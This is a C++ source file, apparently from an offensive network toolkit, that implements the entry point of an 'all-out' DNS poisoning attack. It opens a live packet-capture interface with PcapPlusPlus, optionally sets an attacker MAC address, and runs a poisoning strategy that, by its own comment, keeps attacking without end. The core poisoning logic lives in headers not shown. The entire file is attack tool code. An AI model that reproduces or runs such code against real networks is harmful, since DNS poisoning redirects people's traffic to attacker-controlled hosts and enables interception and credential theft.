#include "dns_poisoning/public.h"
#include "MacAddress.h"
#include "PcapLiveDevice.h"
#include "PcapLiveDeviceList.h"
#include "dns_poisoning/all_out.h"
#include "dns_poisoning/dns_poisoning_strategy.h"
#include <memory>
#include <stdexcept>

/**
 * In the current implementation this method will not terminate and keep
 * peforming the attack.
 */
void ATK::DNS::allOutPoison(const AllOutPoisonOptions &options) {
    pcpp::PcapLiveDevice *device =
        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(
            options.ifaceIpOrName);

    if (device == nullptr) {
        throw std::invalid_argument(options.ifaceIpOrName +
                                    " is not a valid interface");
    }

    std::unique_ptr<ATK::DNS::AllOutDnsPoisoningStrategy> strategy;
    if (!options.attackerMac.empty()) {

        pcpp::MacAddress macAddress(options.attackerMac);
        strategy = AllOutDnsPoisoningStrategy::Builder(device)
                       .attackerMac(macAddress)
                       .build();
    } else {
        strategy = AllOutDnsPoisoningStrategy::Builder(device).build();
    }

    DnsPoisoningContext dnsPoisoningContext(std::move(strategy));

    dnsPoisoningContext.execute();
}
